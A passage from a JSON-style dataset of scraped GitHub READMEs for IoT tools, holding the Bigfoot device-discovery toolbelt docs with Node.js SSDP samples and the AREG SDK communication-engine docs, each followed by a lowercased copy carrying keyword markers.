some validation, change any device internal handling and then\n// return back the state\nstate = req.body.state || state\nconsole.log('\\n State changed:')\nconsole.log(state)\nres.json(state)\n})\nconst httpServer = app.listen(3000, function () {\nconst addr = httpServer.address().address\nconst port = httpServer.address().port\nconsole.log('\ud83d\udc7e Bigfoot device mock started on %s:%s', addr, port)\nssdpServer = new Ssdp.Server({\nsuppressRootDeviceAdvertisements: true,\nlocation: `http://${ip.address()}:${port}`,\nsourcePort: 1900,\n})\nssdpServer.addUSN('bigfoot:bulb')\nssdpServer.start()\n})\nprocess.on('exit', function() {\nssdpServer.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\nTopics stand for a kind of device and groups a set of variables or dimensions to be used. It is a shortcut for the skills of an accessory. For example if the topic of your thing is light or bulb the rest of the parties will immediately know that you must support a certain state.\nState\nSaid of accessory values that can change without necessary user input. They reflect the nature of the appliance; Whether a bulb is on or off, a thermometer reads 30\u00baC or a movement sensor detects presence.\n/* @flow */\nexport type BulbState = {\npower: 0 | 1,\nbrightness: number, // percentage 0-100\nhue?: number, // degrees 0-360\nsaturation?: number, // percentage 0-100\ncolor?: string, // hex conversion of the values above\n}\n*_ Flow is used to describe data types and interfaces throughout the codebase\nThese are the topics supported by Netbeast Dashboard so far:\n/* @flow */\nexport type BulbState = {\npower: 0 | 1,\nbrightness: number, // percentage 0-100\nhue?: number, // degrees 0-360\nsaturation?: number, // percentage 0-100\ncolor?: string, // hex conversion of the values above\n}\nexport type SwitchState = { power: PowerState }\nexport type MusicState = {\nstatus: 'playing' | 'paused',\nvolume: number, // Not sure still that this is a percentage\ntrack: Url,\nposition?: number,\nplaylist?: Array<Object>,\n// rest to be defined\n}\nexport type ThermostatState = {\npower: 0 | 1,\ntemperature: number,\nunits: 'celsius', 'farenheit',\nmode?: string,\n}\nAccessory properties\nAccessory values that require user input through a software client to change, or simply don't. This can be true for the accessory name, icon, label, room they belong, etc. The device MAC address or unique ID are typical immutable properties.\nChanging the accessory name\nBy accessing the route /accessory, it should return all its qualities (both properties and state). For instance, this is how Yeti serializes a Philips Hue bulb:\n{\n\"id\": \"[UNIQUE IMMUTABLE STRING]\",\n\"name\": \"Front Lamp\",\n\"topic\": \"Bulb\",\n\"brand\": \"PhilipsHue\",\n\"room_label\": \"Bedroom\",\n\"bridge\": {\n\"id\": \"[UNIQUE IMMUTABLE STRING]\",\n\"ip\": \"192.168.1.101:80\",\n\"userId\": \"[SECRET UNIQUE STRING]\"\n},\n\"state\": {\n\"brightness\": 98,\n\"color\": \"#f90025\",\n\"colormode\": \"hue\",\n\"power\": 0,\n\"temperature\": 6535.9477124183\n}\n}\nIf a Bigfoot accessory comes with a certain name, that's what will be portrayed in Yeti Smart Home, or what should be displayed in other clients. By implementing both GET and POST at the route /accessory you will have an appliance with a custom name, that is synced across clients.\nYou can add a \"bigfoot\" field with information about the supported protocols and versioning:\n\"bigfoot\": {\n\"version\": \"0.1.0\",\n\"network_ssid\": \"netbeast\",\n\"network_pass\": [SECRET STRING]\n}\nCreate a bridge\nYou can use special topics as app or bridge to connect with accessories that are outside current compatible protocols with the target Bigfoot client (i.e. Yeti)\n\ud83d\udea7 This section is in construction\nRoadmap\nDefine the scope of the project\nWebsite\nOpen channels for collaborators\nWrite strategies\nGet Started\nDiscovery\nPing\nState Mutations\nProperties /accessory\nPairing devices\nReactive events\nNotifications\nNode.js\nCode samples\nWorking samples with virtual devices\nWorking samples with real devices\nGo\nCode samples\nPython\nCode samples\nBut you are still offering a protocol?\nNot at all. Bigfoot project aims to gather a set of strategies over existing protocols and industry standards to make it easier for developers and manufacturers to create IoT experiences together. As React brought us that to representation interfaces, Bigfoot wants you to be able to create React-like hardware responses in a network environment with a set of simple and functional APIs.\nBigfoot topics is a suggested data structure that works out of the box with other tools in the belt. Because, you know, we need things working together :)\nAnyway, those topics are borrowed from many other smart home devices, IoT services and other established protocols. We are going to build translators so you can use this schema as a middleware utility. But this is not opinionated and completely optional. As a matter of fact they will have a raw method alternative to access all the params obscured by any tools, in case you want access to the internals of the things you are working with.\nContributing\nBigfoot is an Open Source Project. This means that:\nIndividuals making significant and valuable contributions are given commit-access to the project to contribute as they see fit. This project is more like an open wiki than a standard guarded open source project.\nRead the Design Principles to understand the resoning behind our decision making. See the CONTRIBUTING.md guide for more details.\nSponsors\nThis project is a reality today thanks to its contributors and sponsors. We are proud to be part of the Toptal Open Source grant program, and compatible with Yeti", "link": "https://github.com/netbeast/bigfoot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "the bigfoot project\na toolbet for iot software tools that work together.\ndiscover devices automatically\nhave pre-made or many compatible user interfaces\nsimple, lightweight apis\nhow does it work?\nget started\nthis guide will allow you to mock up your first connected device in less than a minute.\ndownload yeti smart home\nany bigfoot-compatible software would work. bigfoot is currently fairly young, so this is the first end user software -----> tool !!!  that supports it. you can also contribute iot open source software as part of the netbeast dashboard to implement bigfoot.\nchoose a sample scaffold from the bigfoot project.\ngit clone https://github.com/netbeast/bigfoot-node\ncd bigfoot-node/samples/mock-device\nnpm install\nnpm start\nthis is a sample in node.js. there are also samples in bigfoot-golang and python. we are looking for collaborators to create samples in other languages such as lua. please send us a pull request!\nexplore devices in yeti\ndone \ud83d\udc4f\ud83c\udffd\ndiscovery\nallow your device to be discovered by yeti or any other bigfoot client.\nvar server = require('node-ssdp').server\nserver = new server({\nsourceport: 1900,\nudn: 'my-unique-string-identidier',\n})\nserver.addusn('bigfoot:all')\nserver.start()\nprocess.on('exit', function() {\nserver.stop() // advertise shutting down and stop listening\n})\ncheck out the repo for examples in golang, python or other languages.\ncongratulations, your device is alive!\nat the right you have the bare values of your device. it still has no functionality, so it will fail when you try to control it.\nlet's keep learning...\nping\nthis is intended to be the most lightweight method to check that connectivity to your accessory works. if you implement an interface through http (as described in skills) we'd only need to specify the port where the service is running as the location parameter:\nconst ssdp = require('node-ssdp')\nconst express = require('express')\nconst app = express()\n// respond with \"hello world\" when a get request is made to the homepage\napp.get('/', function (req, res) {\nres.send('hello world')\n})\nconst httpserver = app.listen(3000, function () {\nconst addr = httpserver.address().address\nconst port = httpserver.address().port\nconsole.log('\ud83d\udc7e bigfoor ping sample started on %s:%s', addr, port)\nssdpserver = new ssdp.server({\nlocation: `${addr}:${port}`,\nsourceport: 1900,\n})\nssdpserver.addusn('bigfoot:all')\nssdpserver.start()\n})\nprocess.on('exit', function() {\nssdpserver.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\nas you'd notice already, our device is still pretty dumb. we can only see it appears in our yeti (bigfoot compatible) device. this is because we had not specified any skill or topic that it can work as. so let's move on now.\nskills\nwith skills we plan to refer the capabilities of what an accessory can do. for example, the simplest interface we can implement is a webview for bigfoot compatible software:\n// node/samples/webapp\nconst ssdp = require('node-ssdp')\nconst express = require('express')\nconst ip = require('ip')\nconst app = express()\n// serve a web application to use as user interface or show data\napp.use(express.static('public'))\nconst httpserver = app.listen(3000, function () {\nconst addr = httpserver.address().address\nconst port = httpserver.address().port\nconsole.log('\ud83d\udc7e bigfoot webapp example started on %s:%s', addr, port)\nssdpserver = new ssdp.server({\nlocation: `http://${ip.address()}:${port}`,\nudn: 'bigfoot_very-unique-bigfoot',\nsourceport: 1900,\n})\nssdpserver.addusn('bigfoot:web')\nssdpserver.start()\n})\nprocess.on('exit', function() {\nssdpserver.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\nafter discovery or a request for your skills descriptor you must be able to communicate the things you are able to do, and let the other parties be aware of them. skills are grouped in topics, so when you declare a topic every other bigfoot compatible machine understands how to communicate with it immediately.\nto declare an interface you'd only need to specify the topic on the usn:\nssdpserver.addusn('bigfoot:bulb')\n// or\nssdpserver.addusn('bigfoot:app')\nand bigfoot compatible devices are going to interpret it as different devices.\navailable topics\napp: exposes an app through a webserver, so the developer can implement its own interface\nbridge: a device that can find and talk to other devices\nbulb: to control lightning systems\nmusic : things that can consume\nthermostat: a heat / cold system\nswitch: a plug or system with two states (on/off)\nsensor: an accessory with a read-only state, with keys and values to display\nimplementing a topic\nto understand bigfoot messages you must only implement a protocol to listen to the primitives and then specify it under location. the switch topic is the simplest because you only have to understand on / off set requests and to return the state. this will be done by http post and get methods respectively.\n// node/samples/mock-device\nconst ssdp = require('node-ssdp')\nconst express = require('express')\nvar bodyparser = require('body-parser')\nconst ip = require('ip')\nconst app = express()\nlet state = {\npower: 1,\ncolor: '#ffff00',\nbrightness: 80,\ntemperature: 50,\n}\napp.use(bodyparser.json())\napp.get('/', function (req, res) {\n// here you can return the switch state\nconsole.log('\\n state requested:')\nconsole.log(state)\nres.json(state)\n})\napp.post('/', function (req, res) {\n// maybe perform some validation, change any device internal handling and then\n// return back the state\nstate = req.body.state || state\nconsole.log('\\n state changed:')\nconsole.log(state)\nres.json(state)\n})\nconst httpserver = app.listen(3000, function () {\nconst addr = httpserver.address().address\nconst port = httpserver.address().port\nconsole.log('\ud83d\udc7e bigfoot device mock started on %s:%s', addr, port)\nssdpserver = new ssdp.server({\nsuppressrootdeviceadvertisements: true,\nlocation: `http://${ip.address()}:${port}`,\nsourceport: 1900,\n})\nssdpserver.addusn('bigfoot:bulb')\nssdpserver.start()\n})\nprocess.on('exit', function() {\nssdpserver.stop() // advertise shutting down and stop listening\napp.stop() // close express server\n})\ntopics stand for a kind of device and groups a set of variables or dimensions to be used. it is a shortcut for the skills of an accessory. for example if the topic of your thing is light or bulb the rest of the parties will immediately know that you must support a certain state.\nstate\nsaid of accessory values that can change without necessary user input. they reflect the nature of the appliance; whether a bulb is on or off, a thermometer reads 30\u00bac or a movement sensor detects presence.\n/* @flow */\nexport type bulbstate = {\npower: 0 | 1,\nbrightness: number, // percentage 0-100\nhue?: number, // degrees 0-360\nsaturation?: number, // percentage 0-100\ncolor?: string, // hex conversion of the values above\n}\n*_ flow is used to describe data types and interfaces throughout the codebase\nthese are the topics supported by netbeast dashboard so far:\n/* @flow */\nexport type bulbstate = {\npower: 0 | 1,\nbrightness: number, // percentage 0-100\nhue?: number, // degrees 0-360\nsaturation?: number, // percentage 0-100\ncolor?: string, // hex conversion of the values above\n}\nexport type switchstate = { power: powerstate }\nexport type musicstate = {\nstatus: 'playing' | 'paused',\nvolume: number, // not sure still that this is a percentage\ntrack: url,\nposition?: number,\nplaylist?: array<object>,\n// rest to be defined\n}\nexport type thermostatstate = {\npower: 0 | 1,\ntemperature: number,\nunits: 'celsius', 'farenheit',\nmode?: string,\n}\naccessory properties\naccessory values that require user input through a software client to change, or simply don't. this can be true for the accessory name, icon, label, room they belong, etc. the device mac address or unique id are typical immutable properties.\nchanging the accessory name\nby accessing the route /accessory, it should return all its qualities (both properties and state). for instance, this is how yeti serializes a philips hue bulb:\n{\n\"id\": \"[unique immutable string]\",\n\"name\": \"front lamp\",\n\"topic\": \"bulb\",\n\"brand\": \"philipshue\",\n\"room_label\": \"bedroom\",\n\"bridge\": {\n\"id\": \"[unique immutable string]\",\n\"ip\": \"192.168.1.101:80\",\n\"userid\": \"[secret unique string]\"\n},\n\"state\": {\n\"brightness\": 98,\n\"color\": \"#f90025\",\n\"colormode\": \"hue\",\n\"power\": 0,\n\"temperature\": 6535.9477124183\n}\n}\nif a bigfoot accessory comes with a certain name, that's what will be portrayed in yeti smart home, or what should be displayed in other clients. by implementing both get and post at the route /accessory you will have an appliance with a custom name, that is synced across clients.\nyou can add a \"bigfoot\" field with information about the supported protocols and versioning:\n\"bigfoot\": {\n\"version\": \"0.1.0\",\n\"network_ssid\": \"netbeast\",\n\"network_pass\": [secret string]\n}\ncreate a bridge\nyou can use special topics as app or bridge to connect with accessories that are outside current compatible protocols with the target bigfoot client (i.e. yeti)\n\ud83d\udea7 this section is in construction\nroadmap\ndefine the scope of the project\nwebsite\nopen channels for collaborators\nwrite strategies\nget started\ndiscovery\nping\nstate mutations\nproperties /accessory\npairing devices\nreactive events\nnotifications\nnode.js\ncode samples\nworking samples with virtual devices\nworking samples with real devices\ngo\ncode samples\npython\ncode samples\nbut you are still offering a protocol?\nnot at all. bigfoot project aims to gather a set of strategies over existing protocols and industry standards to make it easier for developers and manufacturers to create iot experiences together. as react brought us that to representation interfaces, bigfoot wants you to be able to create react-like hardware responses in a network environment with a set of simple and functional apis.\nbigfoot topics is a suggested data structure that works out of the box with other tools in the belt. because, you know, we need things working together :)\nanyway, those topics are borrowed from many other smart home devices, iot services and other established protocols. we are going to build translators so you can use this schema as a middleware utility. but this is not opinionated and completely optional. as a matter of fact they will have a raw method alternative to access all the params obscured by any tools, in case you want access to the internals of the things you are working with.\ncontributing\nbigfoot is an open source project. this means that:\nindividuals making significant and valuable contributions are given commit-access to the project to contribute as they see fit. this project is more like an open wiki than a standard guarded open source project.\nread the design principles to understand the resoning behind our decision making. see the contributing.md guide for more details.\nsponsors\nthis project is a reality today thanks to its contributors and sponsors. we are proud to be part of the toptal open source grant program, and compatible with yeti", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000731, "year": null}, {"Unnamed: 0": 747, "autor": 747, "date": null, "content": "AREG SDK\nProject Status\nIntroduction\nAREG SDK is a developer-friendly, interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected Things interact and provide services, as if they act like thin distributed servers.\nTable of contents\nMotivation\nMore than embedded\nComposition\nSoftware build\nSoftware integration\nMulticast router\nLogging service\nDevelopment\nUse cases and benefits\nDistributes solutions\nDriverless devices\nReal-time solutions\nDigital twin\nSimulation and test automations\nExamples\nLicensing\nCall for action\nMotivation\nTraditionally, devices are connected clients to stream data to the cloud or fog servers for further processing.\nSince data is generated and collected at the edge of the network (mist network), it makes sense to change the role of connected Things and provide network accessible (Public) services directly on devices. This extends Cloud to the extreme edge and it is a good foothold for robust solutions such as:\nIncrease data privacy, which is an important factor for sensitive data.\nDecrease data streaming, which is a fundamental condition to optimize network communication.\nDevelop autonomous, intelligent and self-aware devices by providing network services directly in the environment of data origin.\nMore than embedded\nWhen we were designing AREG SDK, the guiding principle was to provide a homogeneous solution for multithreading, multiprocessing and internet communication wrapped in services appropriately having Local, Public and Internet categories. These services are neither processes, nor tasks managed by the operating system, they are software components with predefined interface, which methods are invoked remotely.\n\ud83d\udca1 In current version, the AREG engine handles multithreading (Local) and multiprocessing (Public) communication.\nThe AREG engine forms a fault tolerant system, automatically discovers services, automates communication, simplifies distributed programming, and helps developers to focus on application business logic as if they would program a single process application with one thread where methods of objects are event-driven. The engine guaranties that:\nThe crash of one application does not cause the crash of the system.\nThe service clients are automatically notified about service availability status.\nThe client requests are automatically invoked to run on the service component.\nThe service responses are automatically invoked on the exact client, and they are not mixed or missed.\nThe subscriptions on data, responses and broadcasts are automatically invoked on client when service triggers a call.\nComposition\nAREG SDK consists of:\nMulticast router (mcrouter) to use for IPC. It runs either as a service managed by the OS or as a console application.\nAREG framework (or engine) is a library (shared or static) linked in every application.\nCode generator tool to create client and server base objects from a service prototype document.\nThe framework contains a dynamic and configurable logging service. More tools and features are planned in next releases.\nSoftware build\nAn example to get source codes and compile under Linux. You'd need at least C++17 g++ (default) compiler. Open Terminal console in your projects folder and make following steps:\n# Step 1: Get sources from GitHub\n$ git clone https://github.com/aregtech/areg-sdk.git\n$ cd areg-sdk\n# Step 2: Compile sources from terminal by calling: make [all] [framework] [examples]\n$ make all\nAfter compilation, the binaries are located in <areg-sdk>/product/build/<compiler-platform-path>/bin folder.\nAREG SDK sources are developed for:\nSupported OS Linux (list of POSIX API), Windows 8 and higher.\nSupported CPU x86, x86_64, arm and aarch64.\nSupported compilers Version C++17 GCC, g++, clang and MSVC.\n\ud83d\udca1 The other POSIX-compliant OS and compilers are not tested yet.\nCompile AREG SDK sources and examples:\nOperating System Quick actions to use tools and compile\nLinux or Windows Import projects in Eclipse to compile with POSIX API (you may need to change Toolchain).\nWindows Open areg-sdk.sln file in MS Visual Studio (VS2019 and higher) to compile with Win32 API.\nLinux Open gnome-terminal in Linux and call \u201cmake\u201d to compile with POSIX API.\n\ud83d\udca1 Compilation with Eclipse under Windows might require to switch the Toolchain. For example, Cygwin GCC.\n\ud83d\udca1 For Linux the default compiler is g++. Set prefered C++17 compiler in conf/make/user.mk file.\nDetails on how to change compiler, load and compile sources for various targets are described in HOWTO.\nSoftware integration\nMulitcast router\nConfigure router.init file to set the IP-address and the port of multicast router:\nconnection.address.tcpip = 127.0.0.1# the address of mcrouter host\nconnection.port.tcpip = 8181 # the connection port of mcrouter\nThe multicast router forms the network and can run on any device. For example, in case of M2M communication, it can run on a gateway, in case of IPC it can run on the same machine. In case of multithreading application development there is no need to configure router.init and run mcrouter.\nLogging service\nConfigure log.init to set scopes, log priorities and log file name:\nlog.file = %home%/logs/%appname%_%time%.log # create logs in 'log' subfolder of user home\nscope.mcrouter.*= NOTSET ; # disable logs for mcrouter.\nscope.my_app.* = DEBUG | SCOPE ; # enable all logs of my_app\nscope.my_app.ignore_this_scope = NOTSET ; # disable logs of certain scopes in my_app\nscope.my_app.ignore_this_group_* = NOTSET ; # disable logs of certain scope group in my_app\n\ud83d\udca1 By default, the router.init and log.init files are located in the config subfolder of binaries.\n\ud83d\udca1 To enable all logs of all applications, use scope.* = DEBUG | SCOPE ; .\n\ud83d\udca1 In the current version the logging is possible only in file.\nDevelopment\nThe development guidance and step-by-step example to create a simple service enabled application are described in DEVELOP.\nUse cases and benefits\nAREG SDK can be used in a very large scopes of multithreading and multiprocessing application development running on Linux or Windows machines.\nDistributed solution\nAREG SDK is a distributed computing solution, where the services can be distributed and run on any node of the network. The automatic service discovery makes service location transparent, so that the applications interact as if the components are located in one process. Developers define a model, which is a description of service relationship, and load it to start services during runtime. The services can easily be distributed between multiple processes.\nThe following is a demonstration of a static model description, which is loaded to start services and unloaded to stop them.\n// main.cpp source file.\n// Defines static model with 2 services\nBEGIN_MODEL(NECommon::ModelName)\nBEGIN_REGISTER_THREAD( \"Thread1\" )\nBEGIN_REGISTER_COMPONENT( \"RemoteRegistry\", RemoteRegistryService )\nREGISTER_IMPLEMENT_SERVICE( NERemoteRegistry::ServiceName, NERemoteRegistry::InterfaceVersion )\nEND_REGISTER_COMPONENT( \"RemoteRegistry\" )\nEND_REGISTER_THREAD( \"Thread1\" )\nBEGIN_REGISTER_THREAD( \"Thread2\" )\nBEGIN_REGISTER_COMPONENT( \"SystemShutdown\", SystemShutdownService )\nREGISTER_IMPLEMENT_SERVICE( NESystemShutdown::ServiceName, NESystemShutdown::InterfaceVersion )\nEND_REGISTER_COMPONENT( \"SystemShutdown\" )\nEND_REGISTER_THREAD( \"Thread2\" )\nEND_MODEL(NECommon::ModelName)\n// the main function\nint main()\n{\n// Initialize application, enable logging, servicing and the timer.\nApplication::initApplication(true, true, true, true, nullptr, nullptr );\n// load model to start service components\nApplication::loadModel(NECommon::ModelName);\n// wait until Application quit signal is set.\nApplication::waitAppQuit(NECommon::WAIT_INFINITE);\n// stop and unload service components\nApplication::unloadModel(NECommon::ModelName);\n// release and cleanup resources of application.\nApplication::releaseApplication();\nreturn 0;\n}\nIn the example, the \"RemoveRegistry\" and the \"SystemShudown\" are the names of components called roles, and the NERemoteRegistry::ServiceName and the NESystemShutdown::ServiceName are the interface names. In combination, they define the service name used to access in the network. These MACRO create static model NECommon::ModelName, which is loaded when call Application::loadModel(NECommon::ModelName), and the services are stopped when call Application::unloadModel(NECommon::ModelName).\nIn this example services can be merged in one thread or distributed in 2 processes by defining a model in each process. Independent on service location, neither software developers, nor service client objects feel difference except possible slight network latency when run IPC. The services must have unique names within the scope of visibility. Means, in case of Public services, the names are unique within a network, and in case of Local services, the names are unique within a process scope. An example of developing a service and a client in one and multiple processes is in Hello Service! project described in development guide.\nDriverless devices\nNormally, the devices are supplied with the drivers to install in the system and with the header files to integrate in the application(s). The drivers often run in Kernel mode and the crash of the driver crashes the entire system. Driver development requires special technique, which is different for each operating system, and it is hard to debug.\nOur proposal is to deliver driverless service enabled devices, where device specific services are described in the interface prototype documents.\nIn contrast to drivers, the service development does not differ from user mode application development, it is faster to develop, easily serves multiple applications (service clients), contains less risks and requires less development resources. The client object generated from the supplied service interface prototype document is easily integrated in application to communicate and trigger device specific service(s).\nReal-time solutions\nWhen a remote method of the service interface is called, the engine of AREG SDK immediately generates and delivers messages to the target component, which invokes appropriate methods of addressed service. This makes communication real-time with ultra-low networking latency. Such solutions are highly required to develop time-sensitive applications for automotive, flock of drones, medtech, real-time manufacturing, real-time monitoring and other projects.\nDigital twin\nOften, the digital twin applications use client-server architecture, where the middleware server collects the data of external devices and the UI application virtualizes them. In such solutions devices interact either through server or UI client application. The event-driven and the service-oriented architecture, and the real-time communication of AREG SDK is a perfect solution to develop digital twin applications that virtualize, monitor and control external devices, and immediately react to environment or device state change in real-time mode. External devices may also communicate without additional layers, which is an important factor for emergency, security and safety cases.\nSimulation and test automations\nWhen hardware provisioning to all employees is impossible, testing and checking unexpected phenomena of rapidly changing software in a simulated environment can be the most rational solution. If unit tests are used by developers to test a small portion of code and they may contain bugs, the simulation is used by developers and testers to check the system functionality and stability. Simulations are portable and accessible to everyone, help to optimize solutions and avoid unnecessary risks. Projects using simulations are better prepared for remote work and easier to outsource.\nThe software components in applications normally are split in Data, Controller, Business and the optional Presentation layers. Distributed and service oriented solution of the AREG engine eases system testing in simulated environment, where the Simulation application provides implementation of Data layer services, so that the rest of application can be tested without any change.\nThe same technique of simulating data can be used to create API driven test automations.\nExamples\nThere are various examples to demonstrate features of the AREG SDK. The examples are listed in the examples/README.md document.\nLicensing\nAREG SDK is dual-licensed under free open source license (Apache version 2 license) and commercial license, which gives the commercial support, full rights to create and distribute software without open source license obligations. For licensing details see LICENSE document.\nFor commercial license, support or additional information, please visit Aregtech website or contact info[at]aregtech.com.\nCall for action\nDo you like the project, have new ideas or need features? You are welcome to join the project. To join the development team, please prepare an introduction and code examples. Please also share the project with your connections on and other social media platforms. on GitHub to inspire us and continue to develop the technology with heart! We'll feel useful and motivated to develop more.\nFollow us", "link": "https://github.com/aregtech/areg-sdk", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "areg sdk\nproject status\nintroduction\nareg sdk is a developer-friendly, interface-centric real-time asynchronous communication engine to enable distributed- and mist-computing, where connected things interact and provide services, as if they act like thin distributed servers.\ntable of contents\nmotivation\nmore than embedded\ncomposition\nsoftware build\nsoftware integration\nmulticast router\nlogging service\ndevelopment\nuse cases and benefits\ndistributes solutions\ndriverless devices\nreal-time solutions\ndigital twin\nsimulation and test automations\nexamples\nlicensing\ncall for action\nmotivation\ntraditionally, devices are connected clients to stream data to the cloud or fog servers for further processing.\nsince data is generated and collected at the edge of the network (mist network), it makes sense to change the role of connected things and provide network accessible (public) services directly on devices. this extends cloud to the extreme edge and it is a good foothold for robust solutions such as:\nincrease data privacy, which is an important factor for sensitive data.\ndecrease data streaming, which is a fundamental condition to optimize network communication.\ndevelop autonomous, intelligent and self-aware devices by providing network services directly in the environment of data origin.\nmore than embedded\nwhen we were designing areg sdk, the guiding principle was to provide a homogeneous solution for multithreading, multiprocessing and internet communication wrapped in services appropriately having local, public and internet categories. these services are neither processes, nor tasks managed by the operating system, they are software components with predefined interface, which methods are invoked remotely.\n\ud83d\udca1 in current version, the areg engine handles multithreading (local) and multiprocessing (public) communication.\nthe areg engine forms a fault tolerant system, automatically discovers services, automates communication, simplifies distributed programming, and helps developers to focus on application business logic as if they would program a single process application with one thread where methods of objects are event-driven. the engine guaranties that:\nthe crash of one application does not cause the crash of the system.\nthe service clients are automatically notified about service availability status.\nthe client requests are automatically invoked to run on the service component.\nthe service responses are automatically invoked on the exact client, and they are not mixed or missed.\nthe subscriptions on data, responses and broadcasts are automatically invoked on client when service triggers a call.\ncomposition\nareg sdk consists of:\nmulticast router (mcrouter) to use for ipc. it runs either as a service managed by the os or as a console application.\nareg framework (or engine) is a library (shared or static) linked in every application.\ncode generator -----> tool !!!  to create client and server base objects from a service prototype document.\nthe framework contains a dynamic and configurable logging service. more tools and features are planned in next releases.\nsoftware build\nan example to get source codes and compile under linux. you'd need at least c++17 g++ (default) compiler. open terminal console in your projects folder and make following steps:\n# step 1: get sources from github\n$ git clone https://github.com/aregtech/areg-sdk.git\n$ cd areg-sdk\n# step 2: compile sources from terminal by calling: make [all] [framework] [examples]\n$ make all\nafter compilation, the binaries are located in <areg-sdk>/product/build/<compiler-platform-path>/bin folder.\nareg sdk sources are developed for:\nsupported os linux (list of posix api), windows 8 and higher.\nsupported cpu x86, x86_64, arm and aarch64.\nsupported compilers version c++17 gcc, g++, clang and msvc.\n\ud83d\udca1 the other posix-compliant os and compilers are not tested yet.\ncompile areg sdk sources and examples:\noperating system quick actions to use tools and compile\nlinux or windows import projects in eclipse to compile with posix api (you may need to change toolchain).\nwindows open areg-sdk.sln file in ms visual studio (vs2019 and higher) to compile with win32 api.\nlinux open gnome-terminal in linux and call \u201cmake\u201d to compile with posix api.\n\ud83d\udca1 compilation with eclipse under windows might require to switch the toolchain. for example, cygwin gcc.\n\ud83d\udca1 for linux the default compiler is g++. set prefered c++17 compiler in conf/make/user.mk file.\ndetails on how to change compiler, load and compile sources for various targets are described in howto.\nsoftware integration\nmulitcast router\nconfigure router.init file to set the ip-address and the port of multicast router:\nconnection.address.tcpip = 127.0.0.1# the address of mcrouter host\nconnection.port.tcpip = 8181 # the connection port of mcrouter\nthe multicast router forms the network and can run on any device. for example, in case of m2m communication, it can run on a gateway, in case of ipc it can run on the same machine. in case of multithreading application development there is no need to configure router.init and run mcrouter.\nlogging service\nconfigure log.init to set scopes, log priorities and log file name:\nlog.file = %home%/logs/%appname%_%time%.log # create logs in 'log' subfolder of user home\nscope.mcrouter.*= notset ; # disable logs for mcrouter.\nscope.my_app.* = debug | scope ; # enable all logs of my_app\nscope.my_app.ignore_this_scope = notset ; # disable logs of certain scopes in my_app\nscope.my_app.ignore_this_group_* = notset ; # disable logs of certain scope group in my_app\n\ud83d\udca1 by default, the router.init and log.init files are located in the config subfolder of binaries.\n\ud83d\udca1 to enable all logs of all applications, use scope.* = debug | scope ; .\n\ud83d\udca1 in the current version the logging is possible only in file.\ndevelopment\nthe development guidance and step-by-step example to create a simple service enabled application are described in develop.\nuse cases and benefits\nareg sdk can be used in a very large scopes of multithreading and multiprocessing application development running on linux or windows machines.\ndistributed solution\nareg sdk is a distributed computing solution, where the services can be distributed and run on any node of the network. the automatic service discovery makes service location transparent, so that the applications interact as if the components are located in one process. developers define a model, which is a description of service relationship, and load it to start services during runtime. the services can easily be distributed between multiple processes.\nthe following is a demonstration of a static model description, which is loaded to start services and unloaded to stop them.\n// main.cpp source file.\n// defines static model with 2 services\nbegin_model(necommon::modelname)\nbegin_register_thread( \"thread1\" )\nbegin_register_component( \"remoteregistry\", remoteregistryservice )\nregister_implement_service( neremoteregistry::servicename, neremoteregistry::interfaceversion )\nend_register_component( \"remoteregistry\" )\nend_register_thread( \"thread1\" )\nbegin_register_thread( \"thread2\" )\nbegin_register_component( \"systemshutdown\", systemshutdownservice )\nregister_implement_service( nesystemshutdown::servicename, nesystemshutdown::interfaceversion )\nend_register_component( \"systemshutdown\" )\nend_register_thread( \"thread2\" )\nend_model(necommon::modelname)\n// the main function\nint main()\n{\n// initialize application, enable logging, servicing and the timer.\napplication::initapplication(true, true, true, true, nullptr, nullptr );\n// load model to start service components\napplication::loadmodel(necommon::modelname);\n// wait until application quit signal is set.\napplication::waitappquit(necommon::wait_infinite);\n// stop and unload service components\napplication::unloadmodel(necommon::modelname);\n// release and cleanup resources of application.\napplication::releaseapplication();\nreturn 0;\n}\nin the example, the \"removeregistry\" and the \"systemshudown\" are the names of components called roles, and the neremoteregistry::servicename and the nesystemshutdown::servicename are the interface names. in combination, they define the service name used to access in the network. these macro create static model necommon::modelname, which is loaded when call application::loadmodel(necommon::modelname), and the services are stopped when call application::unloadmodel(necommon::modelname).\nin this example services can be merged in one thread or distributed in 2 processes by defining a model in each process. independent on service location, neither software developers, nor service client objects feel difference except possible slight network latency when run ipc. the services must have unique names within the scope of visibility. means, in case of public services, the names are unique within a network, and in case of local services, the names are unique within a process scope. an example of developing a service and a client in one and multiple processes is in hello service! project described in development guide.\ndriverless devices\nnormally, the devices are supplied with the drivers to install in the system and with the header files to integrate in the application(s). the drivers often run in kernel mode and the crash of the driver crashes the entire system. driver development requires special technique, which is different for each operating system, and it is hard to debug.\nour proposal is to deliver driverless service enabled devices, where device specific services are described in the interface prototype documents.\nin contrast to drivers, the service development does not differ from user mode application development, it is faster to develop, easily serves multiple applications (service clients), contains less risks and requires less development resources. the client object generated from the supplied service interface prototype document is easily integrated in application to communicate and trigger device specific service(s).\nreal-time solutions\nwhen a remote method of the service interface is called, the engine of areg sdk immediately generates and delivers messages to the target component, which invokes appropriate methods of addressed service. this makes communication real-time with ultra-low networking latency. such solutions are highly required to develop time-sensitive applications for automotive, flock of drones, medtech, real-time manufacturing, real-time monitoring and other projects.\ndigital twin\noften, the digital twin applications use client-server architecture, where the middleware server collects the data of external devices and the ui application virtualizes them. in such solutions devices interact either through server or ui client application. the event-driven and the service-oriented architecture, and the real-time communication of areg sdk is a perfect solution to develop digital twin applications that virtualize, monitor and control external devices, and immediately react to environment or device state change in real-time mode. external devices may also communicate without additional layers, which is an important factor for emergency, security and safety cases.\nsimulation and test automations\nwhen hardware provisioning to all employees is impossible, testing and checking unexpected phenomena of rapidly changing software in a simulated environment can be the most rational solution. if unit tests are used by developers to test a small portion of code and they may contain bugs, the simulation is used by developers and testers to check the system functionality and stability. simulations are portable and accessible to everyone, help to optimize solutions and avoid unnecessary risks. projects using simulations are better prepared for remote work and easier to outsource.\nthe software components in applications normally are split in data, controller, business and the optional presentation layers. distributed and service oriented solution of the areg engine eases system testing in simulated 